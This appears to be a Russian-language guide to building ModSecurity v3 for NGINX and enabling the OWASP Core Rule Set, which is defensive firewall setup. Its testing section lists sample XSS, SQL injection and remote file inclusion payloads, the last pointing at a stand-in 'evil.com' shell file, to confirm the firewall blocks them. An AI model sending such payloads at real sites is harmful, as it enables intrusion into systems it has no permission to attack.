# Установка и настройка ModSecurity v3 с OWASP CRS для NGINX

## Шаг 1. Установка зависимостей

```bash
sudo apt update  # обновление списка пакетов
sudo apt install -y git g++ make automake libtool pkg-config libpcre3-dev \
    libxml2 libxml2-dev libyajl-dev libcurl4-openssl-dev libgeoip-dev \
    liblmdb-dev libssl-dev libxml2-utils libpcre2-dev  # установка всех необходимых библиотек для сборки libmodsecurity
```

## Шаг 2. Клонирование и сборка libmodsecurity (ModSecurity v3)

```bash
cd /usr/local/src  # переходим в рабочую директорию для исходников
sudo git clone --depth 1 https://github.com/SpiderLabs/ModSecurity  # клонируем репозиторий с минимальной историей
cd ModSecurity  # заходим в директорию исходников
sudo git submodule init  # инициализируем зависимости проекта
sudo git submodule update  # обновляем зависимости
sudo ./build.sh  # собираем необходимые зависимости и подготавливаем к сборке
sudo ./configure  # конфигурация сборки
sudo make  # сборка проекта (может занять ~15 минут)
sudo make install  # установка собранной библиотеки
```

### Проверка установки библиотеки

```bash
ls -lh /usr/local/lib | grep modsecurity  # проверяем наличие библиотеки в стандартной директории (если пусто — идем дальше)
sudo find / -name 'libmodsecurity*' 2>/dev/null  # ищем все файлы библиотеки в системе
```

Ожидаемые файлы:

- `libmodsecurity.so` — динамическая библиотека
- `libmodsecurity.a` — статическая (необязательная)
- `.so.3`, `.so.3.0.14` — символьные ссылки

## Шаг 3. Сборка модуля nginx для ModSecurity

```bash
cd /usr/local/src  # возвращаемся в исходную директорию
sudo git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git  # клонируем модуль для nginx
cd nginx-1.24.0  # переходим в директорию с исходниками nginx (установите заранее нужную версию)
sudo ./configure --with-compat --add-dynamic-module=../ModSecurity-nginx  # конфигурация nginx с добавлением модуля
sudo make modules  # собираем только модули (без полной сборки nginx)
ls -lh objs/ngx_http_modsecurity_module.so  # проверяем наличие собранного модуля
```

## Шаг 4. Установка и активация модуля nginx

```bash
cp objs/ngx_http_modsecurity_module.so /usr/lib/nginx/modules/  # копируем модуль в директорию модулей nginx
```

Добавить в начало `nginx.conf`:

```
load_module modules/ngx_http_modsecurity_module.so;  # загрузка модуля ModSecurity
```

Проверка и перезапуск:

```bash
nginx -t  # проверка конфигурации
systemctl restart nginx  # перезапуск nginx
```

## Шаг 5. Подготовка конфигурации ModSecurity

```bash
sudo mkdir -p /etc/nginx/modsec  # создаем директорию под конфиги
sudo wget -O /etc/nginx/modsec/modsecurity.conf https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended  # скачиваем базовую конфигурацию
sudo cp /etc/nginx/modsec/modsecurity.conf /etc/nginx/modsec/modsecurity.conf.bak  # создаем бэкап
sudo nano /etc/nginx/modsec/modsecurity.conf  # редактируем файл
# Меняем:
# SecRuleEngine DetectionOnly -> SecRuleEngine On
sudo wget -O /etc/nginx/modsec/unicode.mapping https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping  # скачиваем файл маппинга
```

## Шаг 6. Подключение ModSecurity к nginx-сайту

```nginx
location / {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/modsecurity.conf;
}
```

```bash
nginx -t  # проверка
systemctl restart nginx  # перезапуск
```

## Шаг 7. Подключение OWASP CRS

```bash
cd /etc/nginx/modsec  # переходим в директорию с конфигами
sudo git clone --depth 1 https://github.com/coreruleset/coreruleset.git  # клонируем репозиторий с правилами OWASP
sudo mv coreruleset owasp-crs  # переименовываем папку
sudo cp /etc/nginx/modsec/owasp-crs/crs-setup.conf.example /etc/nginx/modsec/owasp-crs/crs-setup.conf  # копируем базовый конфиг
```

Добавить в конец `modsecurity.conf`:

```
Include /etc/nginx/modsec/owasp-crs/crs-setup.conf
Include /etc/nginx/modsec/owasp-crs/rules/*.conf
```

Проверка и перезапуск:

```bash
nginx -t
systemctl reload nginx
```

---

## Тестирование

**1. XSS**  
URL: `https://laravel.lab.local/?test=<script>alert(1)</script>`

**2. SQLi**  
URL: `https://laravel.lab.local/?id=1'+or+'1'='1`

**3. RFI**  
URL: `https://laravel.lab.local/?file=http://evil.com/shell.txt`

---

## Просмотр логов

```bash
cat /etc/nginx/modsec/modsecurity.conf | grep 'audit'  # находим путь до логов
tail -n 20 /var/log/modsec_audit.log  # просмотр последних записей
```

---

## Повышение Paranoia Level

```bash
nano /etc/nginx/modsec/owasp-crs/crs-setup.conf
```

Добавить или изменить:

```
SecAction \
    "id:900000,\
    phase:1,\
    pass,\
    t:none,\
    nolog,\
    tag:'OWASP_CRS',\
    ver:'OWASP_CRS/4.17.0-dev',\
    setvar:tx.blocking_paranoia_level=2"
```

---

Готово.
